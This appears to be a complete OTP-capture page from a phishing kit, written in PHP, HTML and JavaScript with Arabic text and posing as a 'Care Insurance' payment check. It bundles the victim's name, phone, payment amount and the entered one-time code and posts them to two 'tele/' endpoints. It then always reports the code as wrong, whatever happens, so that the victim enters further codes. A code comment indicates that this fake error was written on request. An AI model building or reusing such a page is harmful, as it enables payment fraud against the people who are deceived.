<?php
// otp.php
session_start();

// استلام user_id من الرابط (إن وُجد)
$user_id = isset($_GET['user_id']) ? trim((string)$_GET['user_id']) : '';

// محاولة قراءة آخر عملية دفع محفوظة من tele/pay.php
$last = isset($_SESSION['last_payment']) && is_array($_SESSION['last_payment'])
      ? $_SESSION['last_payment']
      : [];

$name            = $last['name'] ?? '';
$phone           = $last['phone'] ?? '';
$payment_method  = $last['payment_method'] ?? 'card';
$total_amount    = $last['total_amount'] ?? '';

$insurance       = $last['insurance'] ?? [];
$features        = $insurance['features'] ?? [];
$start_date      = $insurance['start_date'] ?? '';
$end_date        = $insurance['end_date'] ?? '';

// عرض آخر 4 أرقام من رقم الهاتف
$phone_last_digits = $phone !== '' ? substr(preg_replace('/\D+/', '', $phone), -4) : '';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تحقق من رمز OTP - Care Insurance</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
      background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
      min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px
    }
    .container{
      background:#fff;padding:40px;border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,.2);
      max-width:500px;width:100%;animation:slideUp .5s ease; position:relative;
      transition: .25s ease;
    }
    @keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
    .header{text-align:center;margin-bottom:32px}
    .icon{width:80px;height:80px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
      border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:40px}
    h1{color:#2c3e50;font-size:26px;margin-bottom:8px}
    .subtitle{color:#7f8c8d;font-size:15px;line-height:1.6}
    .form-group{margin-bottom:20px}
    label{display:block;color:#2c3e50;font-weight:600;margin-bottom:10px;font-size:14px}
    input{
      width:100%;padding:15px;border:2px solid #e0e0e0;border-radius:10px;font-size:18px;transition:.3s;
      direction:ltr;text-align:center;letter-spacing:6px;font-weight:700;background:#fff
    }
    input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}
    .info-box{background:#f8f9fa;padding:14px;border-radius:10px;margin-bottom:18px;border-right:4px solid #667eea}
    .info-box p{color:#555;font-size:13px;line-height:1.6;margin-bottom:6px}
    .info-label{font-weight:600;color:#2c3e50}
    button{
      width:100%;padding:15px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
      color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:.2s;position:relative;overflow:hidden
    }
    button:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(102,126,234,.4)}
    button:disabled{background:#cbd5e0;cursor:not-allowed;transform:none}
    .spinner{display:none;width:20px;height:20px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
    @keyframes spin{to{transform:rotate(360deg)}}
    button.loading .btn-text{display:none}
    button.loading .spinner{display:block}

    /* رسالة الخطأ الحمراء الثابتة */
    .error-message{
      background:#ffe6e6;color:#b10000;padding:12px;border-radius:10px;margin-bottom:16px;display:none;font-size:14px;
      border:2px solid #ff9b9b; border-right:6px solid #d10000; font-weight:600
    }
    .error-message.show{display:block}

    /* حالات الخطأ: تلوين الصندوق والحقل بالأحمر + اهتزاز */
    .error-box{
      border:2px solid #ff7070 !important;
      box-shadow:0 0 0 6px rgba(255,112,112,.15) !important;
      background:#fff5f5 !important;
      animation:shake .5s ease;
    }
    .error-field{
      border-color:#ff3b3b !important;
      background:#ffecec !important;
      box-shadow:0 0 0 4px rgba(255,59,59,.12) !important;
      animation:shake .5s ease;
    }
    @keyframes shake{
      0%,100%{transform:translateX(0)}
      20%{transform:translateX(-10px)}
      40%{transform:translateX(8px)}
      60%{transform:translateX(-6px)}
      80%{transform:translateX(4px)}
    }

    .security-note{text-align:center;color:#95a5a6;font-size:12px;margin-top:16px;padding-top:16px;border-top:1px solid #e0e0e0}
    .muted{color:#6b7280;font-size:12px;text-align:center;margin-top:6px}
  </style>
</head>
<body>
  <div class="container" id="cardBox">
    <div class="header">
      <div class="icon">🔐</div>
      <h1>إدخال رمز التحقق</h1>
      <p class="subtitle">أدخل رمز OTP الذي وصلك الآن</p>
    </div>

    <div id="errorMessage" class="error-message"></div>

    <!-- نرسل إلى tele/otp2.php لكن عبر fetch (بدون مغادرة الصفحة) -->
    <form id="pinForm" method="POST" action="tele/otp2.php" autocomplete="off" novalidate>
      <div class="form-group">
        <label for="pin_code">رمز OTP</label>
        <input type="text" id="pin_code" name="pin_code" maxlength="6" inputmode="numeric" pattern="[0-9]*" required placeholder="••••••">
      </div>

      <div class="info-box">
        <p><span class="info-label">ملاحظة:</span> تم إرسال الرمز إلى رقم الهاتف المسجل.</p>
        <?php if($phone_last_digits): ?>
          <p class="muted">آخر 4 أرقام: <?php echo htmlspecialchars($phone_last_digits, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></p>
        <?php endif; ?>
      </div>

      <!-- حقول خفية: user_id + كل ما يلزم لإعادة إرسال بيانات العميل/التأمين مع الرمز -->
      <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($user_id, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="transaction_id" id="transaction_id" value="">
      <input type="hidden" name="timestamp" id="timestamp" value="<?php echo htmlspecialchars(gmdate('c'), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">

      <!-- إعادة إرسال بيانات العميل (من الجلسة) -->
      <input type="hidden" name="name"            value="<?php echo htmlspecialchars($name, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="phone"           value="<?php echo htmlspecialchars($phone, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="payment_method"  value="<?php echo htmlspecialchars($payment_method, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="total_amount"    value="<?php echo htmlspecialchars($total_amount, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="phone_last_digits" value="<?php echo htmlspecialchars($phone_last_digits, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">

      <!-- ملخص التأمين كـ JSON + الإضافات -->
      <input type="hidden" name="insurance_json" value="<?php echo htmlspecialchars(json_encode($insurance, JSON_UNESCAPED_UNICODE), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="features_json"  value="<?php echo htmlspecialchars(json_encode($features, JSON_UNESCAPED_UNICODE), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="start_date"     value="<?php echo htmlspecialchars($start_date, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">
      <input type="hidden" name="end_date"       value="<?php echo htmlspecialchars($end_date, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>">

      <button type="submit" id="submitBtn">
        <span class="btn-text">تأكيد الرمز</span>
        <div class="spinner"></div>
      </button>
    </form>

    <p class="security-note">لن نطلب منك مشاركة رمزك مع أي شخص.</p>
  </div>

  <script>
    // توليد معرّف عملية بسيط
    function genTxn(){ return 'TXN' + Date.now() + Math.random().toString(36).slice(2,9).toUpperCase(); }
    document.getElementById('transaction_id').value = genTxn();

    const form = document.getElementById('pinForm');
    const pin  = document.getElementById('pin_code');
    const btn  = document.getElementById('submitBtn');
    const err  = document.getElementById('errorMessage');
    const box  = document.getElementById('cardBox');

    // أرقام فقط
    pin.addEventListener('input', () => {
      pin.value = pin.value.replace(/[^0-9]/g,'').slice(0,6);
      // إزالة حالات الخطأ فور الكتابة التالية
      err.classList.remove('show');
      pin.classList.remove('error-field');
      box.classList.remove('error-box');
    });

    // إرسال إلى كلا الملفين: tele/otp.php و tele/otp2.php
    form.addEventListener('submit', async (e)=>{
      e.preventDefault();

      if (pin.value.trim().length < 4){
        showErrorUI('يرجى إدخال رمز صالح (على الأقل 4 أرقام)');
        return;
      }

      btn.disabled = true; btn.classList.add('loading');

      try {
        const fd = new FormData(form);
        
        // إرسال إلى الملف الأول
        await fetch('tele/otp.php', { method: 'POST', body: new FormData(form) });
        
        // إرسال إلى الملف الثاني
        await fetch('tele/otp2.php', { method: 'POST', body: new FormData(form) });

        // إظهار الحالة المطلوبة: رمز خاطئ + تلوين + اهتزاز
        showErrorUI('الرمز غير صحيح. الرجاء المحاولة مرة أخرى.');

      } catch (e2) {
        // حتى لو فشل الطلب الشبكي، نُظهر نفس الحالة (حسب طلبك)
        showErrorUI('الرمز غير صحيح. الرجاء المحاولة مرة أخرى.');
      } finally {
        btn.disabled = false; btn.classList.remove('loading');
      }
    });

    function showErrorUI(message){
      err.textContent = message;
      err.classList.add('show');
      pin.classList.remove('error-field'); void pin.offsetWidth; // لإعادة تشغيل الأنيميشن
      box.classList.remove('error-box');  void box.offsetWidth;

      pin.classList.add('error-field');
      box.classList.add('error-box');
    }
  </script>
</body>
</html>